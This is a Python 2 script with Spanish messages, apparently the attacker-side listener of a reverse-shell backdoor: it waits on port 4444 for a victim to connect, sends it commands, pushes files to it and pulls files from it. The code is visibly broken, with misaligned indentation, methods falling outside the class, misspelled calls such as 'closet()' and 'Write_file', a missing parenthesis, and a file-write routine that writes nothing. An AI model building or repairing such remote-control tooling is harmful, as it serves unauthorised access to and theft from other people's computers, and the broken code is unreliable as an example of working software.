import socket, json, base64



class listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("[+] Esperando por las conexiones")
        self.connection, address = listener.accept()
        print("[+] Obteniendo conexion desde" + str(address))

     def relieble_send(self, data):
         json_data = json.dumps(data)
         self.connection.send(json_data)

     def relieble_receive(self) :
         json_data = ""
         while True:
             try:
                 json_data = json_data + self.connection.recv(1024) 
                 return json.loads(json_data)
            except ValueError:
                continue

def execute_remotely(self, command):
    self.relieble_send(command)

    if command[0] == "salir" :
        self.connection.closet()
        exit()

     return self.relieble_receive()

 def write_file(self, path, content):
     with open(path, "wb") as file:
         return "[+] Descarga exitosa."  


def read_file(self, path):
    with open(path, "rb") as file:
        return base64.b64encode(file.read())

def run(self):
    while True:
        command = raw_input(">> ") 
        command = command.split(" ") 

        try:
            if command[0] == "subiendo":
                file_content = self.read_file(command[1])  
                command.append(file_content)  

             result = self.execute_remotely(command)

             if command[0] == "descargado" and "[-] Error" not in result:
                 result = self.Write_file(command[1], result)
        except Exception:
            result = "[-] Error durante la ejecucuion del comando."   

        print(result)  

my_listener =  Listener("no quiero que veas mi ip perro", 4444
my_listener.run()        
